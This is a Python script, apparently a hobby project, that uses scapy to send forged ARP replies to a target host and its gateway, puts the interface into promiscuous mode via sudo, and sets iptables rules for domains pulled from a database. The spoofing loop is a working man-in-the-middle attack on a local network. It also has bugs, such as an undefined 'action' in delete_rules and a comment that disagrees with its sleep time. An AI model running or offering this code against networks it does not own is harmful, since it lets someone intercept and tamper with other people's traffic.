#
#https://www.padraig.io/arp-spoofer-1
#

import time
from scapy.all import *
from typing import List
import os
import sys
import threading
import argparse
from netfilterqueue import NetfilterQueue
import pudb
from network_tools import *
import ip_tables as iptables
from db_functions import *

def arp_worker(
        interface: str, target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str, spoofedMacs: list, action: str):
    print('Running arp_spoof() in thread')
    # Build the packets
    target_packet = Ether(dst=target_mac) / ARP(
        op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip
    )
    router_packet = Ether(dst=gateway_mac) / ARP(
        op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip
    )
    create_rules(target_ip,action)
    #pudb.set_trace()
    os.system("sudo ifconfig "+interface+" promisc")
    while target_mac in spoofedMacs:
        
        sendp([target_packet, router_packet], verbose=0, iface=interface)
        #logging.info("arp worker for " + target_mac + " running")
        # Sleep for 1 second between beacons
        os.system("sudo ifconfig "+interface+" promisc")
        time.sleep(100)
        #os.system("sudo ifconfig "+interface+" promisc")
   
        if "44:5E:DC:B1" in target_mac.upper():
            print('target_mac' + target_mac + '\nspoofedMacs List:')
            print(*spoofedMacs, sep=",")

    #target_mac NO LONGER IN spoofedMacs
    #REMOVE target_mac IPTABLE rules
    print("deleting rules for " + target_ip)
    delete_rules(target_ip)



def create_rules(target_ip,action):
    source_rows = db_select("source",[],[])
    sources = [row[1] for row in source_rows]    # row[1] is the 'domain' field
    for source in sources:
        iptables.create_rule(target_ip,source,action)
        
def delete_rules(target_ip):
    source_rows = db_select("source",[],[])
    sources = [row[1] for row in source_rows]    # row[1] is the 'domain' field
    for source in sources:
        iptables.delete_rule(target_ip,source,action)
        

#def arp_setup(interface, target_ip, target_mac, gateway_ip, gateway_mac, spoofedMacs):
#    # Loop forever and beacon packets
#    try:
#        global arp_spoof_thread
#        arp_spoof_thread = threading.Thread(
#            target=arp_spoof,
#            args=(interface, target_ip, target_mac, gateway_ip, gateway_mac, spoofedMacs),
#            daemon=True,
#        )
#        return arp_spoof_thread
#        #arp_spoof_thread.start()
#    except Exception as e:
#        if hasattr(e,'message'):
#            print(e.message)
#        else:
#            print(e)
